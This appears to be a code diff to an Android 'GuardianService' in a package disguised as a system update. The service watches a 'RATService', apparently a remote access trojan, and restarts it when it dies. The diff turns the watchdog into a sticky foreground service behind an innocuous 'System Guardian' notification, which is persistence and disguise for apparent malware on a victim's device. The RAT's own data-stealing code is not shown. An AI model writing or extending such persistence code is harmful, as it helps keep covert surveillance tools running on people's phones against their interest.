@@ -1,6 +1,9 @@
 package com.android.system.update;
 
 import android.app.ActivityManager;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.Service;
 import android.content.ComponentName;
 import android.content.Context;
@@ -10,7 +13,7 @@ import android.os.Build;
 import android.os.IBinder;
 import android.os.RemoteException;
 import android.util.Log;
-
+import androidx.core.app.NotificationCompat;
 import java.util.Timer;
 import java.util.TimerTask;
 
@@ -18,6 +21,9 @@ public class GuardianService extends Service {
     
     private static final String TAG = "GuardianService";
     private static final long CHECK_INTERVAL = 30000; // 30 seconds
+    private static final int NOTIFICATION_ID = 1001;
+    private static final String CHANNEL_ID = "guardian_channel";
+    
     private Timer timer;
     private boolean isBound = false;
     private RATService.RATServiceBinder ratServiceBinder;
@@ -48,6 +54,9 @@ public class GuardianService extends Service {
         super.onCreate();
         Log.d(TAG, "GuardianService created");
         
+        // IMPORTANT: Start as foreground service immediately
+        startForegroundService();
+        
         // Bind to RATService for monitoring
         bindToRATService();
         
@@ -55,8 +64,45 @@ public class GuardianService extends Service {
         startMonitoring();
     }
     
+    private void startForegroundService() {
+        // Create notification channel for Android O+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                CHANNEL_ID,
+                "Guardian Service",
+                NotificationManager.IMPORTANCE_LOW
+            );
+            channel.setDescription("Monitors and maintains system services");
+            channel.setShowBadge(false);
+            
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            manager.createNotificationChannel(channel);
+        }
+        
+        // Build the notification
+        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("System Guardian")
+            .setContentText("Monitoring system services")
+            .setSmallIcon(android.R.drawable.ic_menu_manage) // Use a proper icon
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setCategory(Notification.CATEGORY_SERVICE)
+            .build();
+        
+        // Start as foreground service
+        startForeground(NOTIFICATION_ID, notification);
+        Log.d(TAG, "Started as foreground service with notification");
+    }
+    
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        Log.d(TAG, "onStartCommand called");
+        
+        // If service was restarted, ensure we're still in foreground
+        if (intent == null) {
+            // Service was restarted by system
+            startForegroundService();
+        }
+        
         return START_STICKY; // Keep service alive
     }
     
@@ -101,11 +147,10 @@ public class GuardianService extends Service {
     private void restartRATService() {
         Log.d(TAG, "Restarting RATService");
         Intent intent = new Intent(this, RATService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(intent);
-        } else {
-            startService(intent);
-        }
+        
+        // Use startService instead of startForegroundService for RATService
+        // since it might not be a foreground service
+        startService(intent);
         
         // Try to rebind
         bindToRATService();
@@ -130,6 +175,8 @@ public class GuardianService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
+        Log.d(TAG, "GuardianService destroyed");
+        
         if (timer != null) {
             timer.cancel();
         }
